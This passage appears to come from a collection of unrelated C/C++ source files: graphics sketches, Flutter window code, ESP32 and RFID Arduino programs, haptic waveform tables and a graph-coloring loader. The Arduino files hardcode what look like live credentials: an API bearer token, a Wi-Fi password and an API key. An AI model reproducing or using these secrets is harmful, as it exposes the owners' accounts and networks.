this->radius_list[i] * 0.1, ofColor(255, 0, 255, 64), ofColor(255, 0, 0));\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::draw() {\r\n\r\n\tthis->cam.begin();\r\n\tofRotateY(ofGetFrameNum() * 1.44);\r\n\r\n\tthis->face.draw();\r\n\tthis->frame.drawWireframe();\r\n\r\n\tthis->cam.end();\r\n\r\n\t/*\r\n\tint start = 300;\r\n\tif (ofGetFrameNum() > start) {\r\n\r\n\t\tostringstream os;\r\n\t\tos << setw(4) << setfill('0') << ofGetFrameNum() - start;\r\n\t\tofImage image;\r\n\t\timage.grabScreen(0, 0, ofGetWidth(), ofGetHeight());\r\n\t\timage.saveImage(\"image/cap/img_\" + os.str() + \".jpg\");\r\n\t\tif (ofGetFrameNum() - start >= 25 * 20) {\r\n\r\n\t\t\tstd::exit(1);\r\n\t\t}\r\n\t}\r\n\t*/\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setRingToMesh(ofMesh& face_target, ofMesh& frame_target, glm::vec3 location, glm::vec3 rotation, float radius, float height, ofColor face_color, ofColor frame_color) {\r\n\r\n\tint index = face_target.getNumVertices();\r\n\r\n\tfor (int deg = 0; deg < 360; deg += 5) {\r\n\r\n\t\tvector<glm::vec3> vertices;\r\n\t\tvertices.push_back(glm::vec3(radius * cos(deg * DEG_TO_RAD), radius * sin(deg * DEG_TO_RAD), height * -0.5));\r\n\t\tvertices.push_back(glm::vec3(radius * cos((deg + 5) * DEG_TO_RAD), radius * sin((deg + 5) * DEG_TO_RAD), height * -0.5));\r\n\t\tvertices.push_back(glm::vec3(radius * cos((deg + 5) * DEG_TO_RAD), radius * sin((deg + 5) * DEG_TO_RAD), height * 0.5));\r\n\t\tvertices.push_back(glm::vec3(radius * cos(deg * DEG_TO_RAD), radius * sin(deg * DEG_TO_RAD), height * 0.5));\r\n\r\n\t\tfor (auto& vertex : vertices) {\r\n\r\n\t\t\tauto rotation_x = glm::rotate(glm::mat4(), rotation.x * (float)DEG_TO_RAD, glm::vec3(1, 0, 0));\r\n\t\t\tauto rotation_y = glm::rotate(glm::mat4(), rotation.y * (float)DEG_TO_RAD, glm::vec3(0, 1, 0));\r\n\t\t\tauto rotation_z = glm::rotate(glm::mat4(), rotation.z * (float)DEG_TO_RAD, glm::vec3(0, 0, 1));\r\n\r\n\t\t\tvertex = glm::vec4(vertex, 0) * rotation_y * rotation_x + glm::vec4(location, 0);\r\n\t\t}\r\n\r\n\t\tauto face_index = face_target.getNumVertices();\r\n\t\tface_target.addVertices(vertices);\r\n\r\n\t\tface_target.addIndex(face_index + 0); face_target.addIndex(face_index + 1); face_target.addIndex(face_index + 2);\r\n\t\tface_target.addIndex(face_index + 0); face_target.addIndex(face_index + 2); face_target.addIndex(face_index + 3);\r\n\r\n\t\tauto frame_index = frame_target.getNumVertices();\r\n\t\tframe_target.addVertices(vertices);\r\n\r\n\t\tframe_target.addIndex(frame_index + 0); frame_target.addIndex(frame_index + 1);\r\n\t\tframe_target.addIndex(frame_index + 2); frame_target.addIndex(frame_index + 3);\r\n\r\n\t\tfor (int i = 0; i < vertices.size(); i++) {\r\n\r\n\t\t\tface_target.addColor(face_color);\r\n\t\t\tframe_target.addColor(frame_color);\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nint main() {\r\n\r\n\tofSetupOpenGL(720, 720, OF_WINDOW);\r\n\tofRunApp(new ofApp());\r\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <Arduino.h>\n#include <HTTPClient.h>\n#include \"ArduinoJson.h\" // https://arduinojson.org/\n\n#include \"secrets.h\"\n\n#define SensorPin 35\n\nString getTime() //* String: Unix\n{\n  time_t now;\n  struct tm timeinfo;\n  if (!getLocalTime(&timeinfo))\n  {\n    // Serial.println(\"Failed to obtain time\");\n    return (\"0\");\n  }\n  time(&now);\n  String strtm = String(now) + \"000\";\n  return (strtm);\n}\n\nvoid upload(String body)\n{\n  HTTPClient http;\n  http.begin(\"https://api.axiom.co/v1/datasets/esp/ingest\");\n  http.addHeader(\"Content-Type\", \"application/json\");\n  http.addHeader(\"Authorization\", \"Bearer xaat-6268ec0b-04a2-45e2-80c4-e0fb9571db21\");\n\n  String httpRequestData = body;\n\n  int httpResponseCode = http.POST(httpRequestData);\n\n  // Serial.print(\"HTTP Response code: \");\n  // Serial.println(httpResponseCode);\n\n  http.end();\n}\n\nvoid setup(void)\n{\n  //* Serial\n  Serial.begin(115200);\n  Serial.println(\"Moin\");\n\n  //* Wifi\n  Serial.print(\"Verbinde mit Wlan\");\n  WiFi.mode(WIFI_STA);\n  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);\n  Serial.println(\"\");\n  while (WiFi.status() != WL_CONNECTED) // Wait for connection\n  {\n    delay(500);\n    Serial.print(\".\");\n  }\n  Serial.println(\"\"); // Wenn Ferbunden\n  Serial.print(\"IP Addresse: \");\n  Serial.print(WiFi.localIP());\n  Serial.print(WiFi.status());\n  Serial.println(\"\");\n\n  //* Zeit:\n  Serial.println(\"Hole NTP Zeit\");\n  configTime(0, 0, \"pool.ntp.org\");\n  Serial.print(\"Epoch Time: \");\n  Serial.println(getTime());\n}\n\nvoid loop()\n{\n\n  String data;\n  DynamicJsonDocument doc(1024);\n\n  int value = analogRead(SensorPin);\n\n  doc[\"_time\"] = getTime();\n  doc[\"ADC_1\"] = value;\n\n  serializeJson(doc, data);\n  data = \"[\" + data + \"]\";\n\n  Serial.println(data);\n  upload(data);\n  // delay(100);\n\n  // Serial.println(value);\n}\n",
    "#include <Arduino.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <MFRC522.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\n#include <WiFi.h>\n#include <HTTPClient.h>\n\n// put define\n#define RST_PIN 0\n#define SS_PIN 5\n#define SCREEN_WIDTH 128\n#define SCREEN_HEIGHT 64\n#define OLED_RESET -1\n#define SCREEN_ADDRESS 0x3C\n#define BUTTON_PIN 33\n#define BACK_BUTTON_PIN 25\n#define BUZZER 4\n\n// global variable\nAdafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);\nconst char *ssid = \"TP-LINK_7B7A\";\nconst char *password = \"78084063\";\nconst char *postServer = \"https://embwebapp.000webhostapp.com/post-esp-data.php\";\nconst char *updateServer = \"https://embwebapp.000webhostapp.com/update-checkin.php\";\nString getServer = \"https://embwebapp.000webhostapp.com/get-id.php\";\nString apiKeyValue = \"tPmAT5Ab3j7F9\";\n\nMFRC522 mfrc522(SS_PIN, RST_PIN);\nMFRC522::MIFARE_Key key;\nMFRC522::StatusCode status;\n//  store cardID from mifare 1K card\nbyte cardID[4];\n// convert UID from mifare 1K card to String\nString cardIdString;\n// basic Info\nString name;\nString phone;\n// if read ID success readIdSuccess will be true\nbool readIdSuccess = false;\n// if Id exist on server isIdExist will be true\nbool isIdExist = false;\nbool httpRequestSuccess = false;\n\nconst int shortPressTime = 500;\nconst int longPressTime = 1000;\nint lastState = LOW;\nint currentState;\nunsigned long pressedTime = 0;\nunsigned long releasedTime = 0;\nbool isPressing = false;\nbool isLongDetected = false;\n// variables below use for change the screen\nuint8_t change = 0;\nuint8_t prevChange = 0;\nbool mainScreen = true;\n\n// put function declarations here:\n// write new info and store as a String \nvoid newInfo();\n// convert byte to Hex and store as a String\nString byteToHex(byte value);\n// read UID from mifare 1K card\nvoid readID();\n\n// main program \nvoid rfidProgram();\n\n// this function use for detect press\n  // hold the BUTTON_PIN about 1s to select function\n  // press the BUTTON_PIN to change between functions\n  // press BACK_BUTTON_PIN to return to the main screen\nvoid detectPress();\nvoid refreshMainScreen();\nvoid refreshSubScreen();\nvoid header();\nvoid mainLayer();\n// Interrupt generate each time the BACK_BUTTON_PIN is pressed\nvoid IRAM_ATTR isr();\n\n// this function INSERT Data to server\nvoid insertData();\n// this function will send the id from mifare 1K card and find it in the database.\nvoid checkIdExist();\n// this function will send the id from mifare 1K card and find it in the database, if id exist \n// checkin value in database will increase by 1.\nvoid updateCheckin();\n\nvoid setup()\n{\n  // put your setup code here, to run once:\n  Serial.begin(115200);\n\n  /* io init */\n  pinMode(BUTTON_PIN, INPUT_PULLUP);\n  pinMode(BACK_BUTTON_PIN, INPUT_PULLUP);\n  attachInterrupt(BACK_BUTTON_PIN, isr, FALLING);\n\n  /* ssd1306 init */\n  if (!display.begin(SSD1306_SWITCHCAPVCC, SCREEN_ADDRESS))\n  {\n    Serial.println(F(\"SSD1306 allocation failed\"));\n    for (;;)\n      ;\n  }\n  display.clearDisplay();\n\n  /* mfrc522 init */\n  SPI.begin();\n  mfrc522.PCD_Init();\n  /* all keys set to FFFFFFFFFFFFh at chip delivery from factory */\n  for (byte i = 0; i < 6; i++)\n  {\n    key.keyByte[i] = 0xFF;\n  }\n\n  /* wifi init */\n  WiFi.begin(ssid, password);\n  Serial.println(\"Connecting\");\n  while (WiFi.status() != WL_CONNECTED)\n  {\n    delay(500);\n    Serial.print(\".\");\n  }\n  Serial.println(\"\");\n  Serial.print(\"Connected to WiFi network with IP Address: \");\n  Serial.println(WiFi.localIP());\n}\n\nvoid loop()\n{\n  // put your main code here, to run repeatedly:\n  rfidProgram();\n}\n\nvoid newInfo()\n{\n  // input name\n  Serial.println(\"--------------------\");\n  Serial.println(\"Type name\");\n  while (Serial.available() == 0)\n  {\n  }\n  name = Serial.readStringUntil('\\n');\n  Serial.println(name);\n\n  // input phone\n  Serial.println(\"--------------------\");\n  Serial.println(\"Type phone\");\n  while (Serial.available() == 0)\n  {\n  }\n  phone = Serial.readStringUntil('\\n');\n  Serial.println(phone);\n}\n\nString byteToHex(byte value) {\n  char hexChars[] = \"0123456789ABCDEF\";\n  String hexString = \"\";\n\n  hexString += hexChars[(value >> 4) & 0x0F];\n  hexString += hexChars[value & 0x0F];\n\n  return hexString;\n}\n\nvoid readID()\n{\n  cardIdString = \"\";\n\n  if (!mfrc522.PICC_IsNewCardPresent())\n  {\n    return;\n  }\n\n  if (!mfrc522.PICC_ReadCardSerial())\n  {\n    return;\n  }\n\n  for (byte i = 0; i < mfrc522.uid.size; i++)\n  {\n    cardID[i] = mfrc522.uid.uidByte[i];\n    cardIdString += byteToHex(cardID[i]);\n  }\n  display.setCursor(0, 10);\n  display.print(\"Card ID: \");\n  display.setCursor(50, 10);\n  display.print(cardIdString);\n  readIdSuccess = true;\n\n  mfrc522.PICC_HaltA();\n  mfrc522.PCD_StopCrypto1();\n}\n\nvoid rfidProgram()\n{\n  detectPress();\n\n  if (mainScreen)\n  {\n    mainLayer();\n  }\n\n  if (!mainScreen)\n  {\n    if (change == 1)\n    {\n      display.setCursor(0, 0);\n      display.print(\"---Check-In---\");\n      readID();\n      if (readIdSuccess)\n      {\n        checkIdExist();\n        if (isIdExist && httpRequestSuccess)\n        {\n     ",
    "/*\n * Copyright (c) 2020, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n * Changes from Qualcomm Innovation Center are provided under the following license:\n * Copyright (c) 2022-2023 Qualcomm Innovation Center, Inc. All rights reserved.\n * SPDX-License-Identifier: BSD-3-Clause-Clear\n */\n\n#include \"effect.h\"\n\n#define ARRAY_SIZE(a) (sizeof(a) / sizeof(*(a)))\n\n/* ~170 HZ sine waveform */\nstatic const int8_t effect_0[] = {\n    17,  34,  50,  65,  79,  92,  103, 112, 119, 124,\n    127, 127, 126, 122, 116, 108, 98,  86,  73,  58,\n    42,  26,  9,   -8,  -25, -41, -57, -72, -85, -97,\n    -108, -116, -122, -126, -127, -127, -125, -120,\n    -113, -104, -93,  -80, -66, -51, -35, -18, -1,\n};\n\nstatic const int8_t effect_1[] = {\n    -1, -18, -35, -51, -66, -80, -93, -104, -113,\n    -120, -125, -127, -127, -126, -122, -116, -108,\n    -97, -85, -72, -57, -41, -25, -8, 9, 26, 42,\n    58, 73, 86, 98, 108, 116, 122, 126, 127, 127,\n    124, 119, 112, 103, 92, 79, 65, 50, 34, 17,\n};\n\nstatic const int8_t primitive_0[] = {\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n};\n\nstatic const int8_t primitive_1[] = {\n    17,  34,  50,  65,  79,  92,  103, 112, 119, 124,\n    127, 127, 126, 122, 116, 108, 98,  86,  73,  58,\n    42,  26,  9,   -8,  -25, -41, -57, -72, -85, -97,\n    -108, -116, -122, -126, -127, -127, -125, -120,\n    -113, -104, -93,  -80, -66, -51, -35, -18, -1,\n};\n\nstatic const int8_t primitive_2[] = {\n    17,  34,  50,  65,  79,  92,  103, 112, 119, 124,\n    127, 127, 126, 122, 116, 108, 98,  86,  73,  58,\n    42,  26,  9,   -8,  -25, -41, -57, -72, -85, -97,\n    -108, -116, -122, -126, -127, -127, -125, -120,\n    -113, -104, -93,  -80, -66, -51, -35, -18, -1,\n};\n\nstatic const struct effect_stream effects[] = {\n    {\n        .effect_id = 0,\n        .data = effect_0,\n        .length = ARRAY_SIZE(effect_0),\n        .play_rate_hz = 8000,\n    },\n\n    {\n        .effect_id = 1,\n        .data = effect_1,\n        .length = ARRAY_SIZE(effect_1),\n        .play_rate_hz = 8000,\n    },\n};\n\nstatic const struct effect_stream primitives[] = {\n    {\n        .effect_id = 0,\n        .data = primitive_0,\n        .length = ARRAY_SIZE(primitive_0),\n        .play_rate_hz = 8000,\n    },\n\n    {\n        .effect_id = 1,\n        .data = primitive_1,\n        .length = ARRAY_SIZE(primitive_1),\n        .play_rate_hz = 8000,\n    },\n\n    {\n        .effect_id = 2,\n        .data = primitive_2,\n        .length = ARRAY_SIZE(primitive_2),\n        .play_rate_hz = 8000,\n    },\n};\n\nconst struct effect_stream *get_effect_stream(uint32_t effect_id)\n{\n    int i;\n\n    if ((effect_id & 0x8000) != 0) {\n        effect_id = effect_id & 0x7fff;\n\n        for (i = 0; i < ARRAY_SIZE(primitives); i++) {\n            if (effect_id == primitives[i].effect_id)\n                return &primitives[i];\n        }\n    } else {\n        for (i = 0; i < ARRAY_SIZE(effects); i++) {\n            if (effect_id == effects[i].effect_id)\n                return &effects[i];\n        }\n    }\n\n    return NULL;\n}\n",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\nusing namespace std;\r\n \r\nint main() {\r\n    srand(time(0));\r\n    char playAgain;\r\n    do {\r\n        int randomNumber = rand() % 100 + 1;\r\n        int guess;\r\n        int attempts = 0;\r\n        int score = 100;\r\n        cout << \"Welcome to the Number Guessing Game!\" << endl;\r\n        cout << \"Try to guess the number between 1 and 100\" << endl;\r\n        do {\r\n            cout << \"Enter your guess: \";\r\n            cin >> guess;\r\n            attempts++;\r\n            if (guess > randomNumber) {\r\n                cout << \"Too high! Try again\" << endl;\r\n                score -= 10;\r\n            } else if (guess < randomNumber) {\r\n                cout << \"Too low! Try again\" << endl;\r\n                score -= 10;\r\n            } else {\r\n                cout << \"You guessed the number \" << randomNumber << \" in \" << attempts << \" attempts!\" << endl;\r\n                cout << \"Your score is: \" << score << endl;\r\n            }\r\n        } while (guess != randomNumber && score > 0);\r\n        if (score == 0) {\r\n            cout << \"Game over!\" << endl;\r\n        }\r\n        cout << \"Do you want to play again? (y/n): \";\r\n        cin >> playAgain;\r\n    } while (playAgain == 'y' || playAgain == 'Y');\r\n    cout << \"Thank you for playing!\" << endl;\r\n    return 0;\r\n}\r\n\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <string.h>\r\n#include <iostream>\r\n#include <fstream>\r\n#include <cmath>\r\n#include \"GrundyInstance.h\"\r\n\r\nGrundyInstance::GrundyInstance(const std::string& instanceFile) throw(GrundyInstance::Error) :\r\n\t\tname(\"\"), comment(\"\"), problemType(\"\"), nNodes(0) {\r\n\tstd::ifstream fin(instanceFile.c_str());\r\n\tif(! fin) { throw Error(\"GrundyInstance: Cannot open input file.\"); }\r\n\r\n\tstd::string line;\r\n\tstd::string token;\r\n\tint simpleInstancePattern = 0;\r\n\tint nEdges=0;\r\n\tint auxNumNodes, auxNumEdges;\r\n\t// WARNING: the code below assumes an ordered input file following a280.tsp\r\n\t//          it will not work with all instances in the TSPLIB.\r\n\ttry {\r\n\t\tif(strstr(instanceFile.c_str(), \"B_\") != NULL || strstr(instanceFile.c_str(), \"CB_\") != NULL){\r\n\t\t\tstd::getline(fin, line);\r\n\t\t\tstd::istringstream sin(line);\r\n\t\t\tsin >> nNodes; \r\n\t\t\tsimpleInstancePattern = 1;\r\n\t\t}else if(strstr(instanceFile.c_str(), \"mtx\") != NULL){\r\n\t\t\tstd::getline(fin, line);\r\n\t\t\tstd::getline(fin, line);\r\n\t\t\tstd::istringstream sin(line);\r\n\t\t\tsin >> nNodes >> auxNumNodes >> auxNumEdges; \r\n\t\t\tsimpleInstancePattern = 2;\r\n\t\t}else{\r\n\t\t\tchar beginCharRead = 'p', actualCharRead = 'c';\r\n\t\t\tstd::string temp = \"\";\r\n\r\n\t\t\twhile(actualCharRead != beginCharRead){\r\n\t\t\t\tstd::getline(fin, line);\r\n\t\t\t\tactualCharRead = line[0];\r\n\t\t\t}\r\n\t\t\tstd::istringstream sin(line);\r\n\t\t\tsin >> beginCharRead >> temp >> nNodes >> nEdges;\r\n\t\t}\r\n\t\t\r\n\t\tnodes.resize(nNodes);\r\n\t\tcolorNodes.resize(nNodes);\r\n\t\t\r\n\t\tstd::getline(fin, line);\r\n\t\twhile(!isEOF(line) && !fin.eof()) {\r\n\t\t\treadNodes(line, simpleInstancePattern);\r\n\t\t\tstd::getline(fin, line);\r\n\t\t}\r\n\r\n\t\tmaxDegree = 0;\r\n\t\tfor(int i = 0; i < nNodes; i++){\r\n\t\t\tint vSize =  nodes[i].size();\r\n\t\t\tmaxDegree = std::max(maxDegree, vSize);\r\n\t\t}\r\n\r\n\t}\r\n\tcatch(const Error& error) { throw error; }\r\n}\r\n\r\nvoid GrundyInstance::readInitialSolutions(const std::string& solFile) \r\n\tthrow(GrundyInstance::Error) {\r\n\r\n\tstd::ifstream fin(solFile.c_str());\r\n\tif(! fin) { throw Error(\"GrundyInstance: Cannot open input file.\"); }\r\n\r\n\tchar identifyType;\r\n\tint readNode;\r\n\tstd::string line;\r\n\tstd::string token;\r\n\ttry {\r\n\t\tstd::vector<int> nodesInitialSol;\r\n\t\twhile(!fin.eof()){\r\n\t\t\tstd::getline(fin, line);\r\n\t\t\tstd::istringstream sin(line);\r\n\t\t\tsin >> identifyType;\r\n\t\t\tif(identifyType == 'v'){\r\n\t\t\t\tsin >> readNode;\r\n\t\t\t\tnodesInitialSol.push_back(readNode);\r\n\t\t\t}else{\r\n\t\t\t\tinitialSolutions.push_back(convertToChromossome(nodesInitialSol));\r\n\t\t\t\tnodesInitialSol.clear();\r\n\t\t\t}\r\n\t\t}\r\n\t}catch(const Error& error) { throw error; }\r\n}\r\n\r\nstd::vector<double> GrundyInstance::convertToChromossome(std::vector<int> nodesOrder){\r\n\tstd::vector<double> encodedChromossome;\r\n\tencodedChromossome.resize(nNodes);\r\n\tdouble step = 1/nNodes, alleloValue = 1.0;\r\n\tfor(int i=0; i<nodesOrder.size(); i++){\r\n\t\tencodedChromossome[nodesOrder[i]] = alleloValue;\r\n\t\talleloValue -= step;\r\n\t}\r\n\treturn encodedChromossome;\r\n}\r\n\r\nGrundyInstance::~GrundyInstance() { }\r\n\r\nunsigned GrundyInstance::getNumNodes() const { return nNodes; }\r\n\r\nvoid GrundyInstance::setGlobalBestFitness(int newGlobalBestFitness) { globalBestFitness = newGlobalBestFitness;}\r\n\r\nvoid GrundyInstance::readNodes(const std::string& line, int simpleInstancePattern) throw(GrundyInstance::Error) {\r\n\tstd::istringstream sin(line);\r\n\r\n\tint x, y;\r\n\tstd::string edgeId;\r\n\r\n\tif(simpleInstancePattern > 